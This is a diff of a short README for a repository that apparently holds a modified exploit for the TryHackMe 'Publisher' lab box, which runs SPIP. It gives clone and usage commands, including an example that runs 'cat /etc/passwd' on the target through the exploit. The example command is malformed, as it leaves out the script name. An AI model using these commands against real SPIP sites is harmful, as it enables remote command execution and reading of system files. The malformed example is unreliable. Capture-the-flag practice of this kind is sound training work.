@@ -1,2 +1,13 @@
 # Publisher--THM
 Modify exploit to Publisher BOX on TryHackMe
+
+## Install >
+
+```
+git clone https://github.com/TheSysRat/Publisher--THM
+cd Publisher--THM
+python3 expolit.py -u <url>/spip -c <command> -v
+
+Example:
+python3 http://publisher.thm/spip -c 'cat /etc/passwd' -v
+```
